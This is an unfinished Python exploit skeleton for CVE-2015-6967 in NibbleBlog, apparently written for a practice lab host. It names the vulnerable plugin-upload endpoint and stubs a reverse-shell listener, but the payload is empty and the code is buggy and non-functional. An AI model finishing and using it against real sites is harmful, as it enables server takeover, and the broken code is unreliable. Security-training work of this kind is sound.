#!/usr/bin/python
import requests
import argparse

class NibbleExploit:

    __cve = "CVE-2015-6967"
    __description = ""

    def __init__(self):
        """ Load Exploit """
        print("Initialising {0}".format(self.__cve))

    def start_listener(self, local_port=4444, local_ip="127.0.0.1"):
        """ Load listener object """
        x = Listener()
        host = "{protocol}://{0}:{1}".format(local_ip, local_port, protocol="http")
        x.run(host)
        return x

class Listener:

    __ip_address = "0.0.0.0"
    __port_number = 0

    def __init__(self):
        """ Load Listener """
        print("Initialising Listener")
    
    def run(self, listener_address):
        """ Set Listener to Run """
        print("Running listener on {0}".format(listener_address))

    def ip(self):
        return self.__ip_address

def main():
    """ Parse Args """
    parser = argparse.ArgumentParser()
    parser.add_argument("Target URL", help="Base URL for the target NibbleBlog installation e.g. http://10.10.10.75/nibbleblog")
    parser.parse_args()

    """ Init Exploit """
    exploit = NibbleExploit()
    listener = exploit.start_listener()

    print(listener.ip)


    """
    payload = {  }
    r = requests.post('http://10.10.10.75/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image')
    post
    """

if __name__ == "__main__":
    main()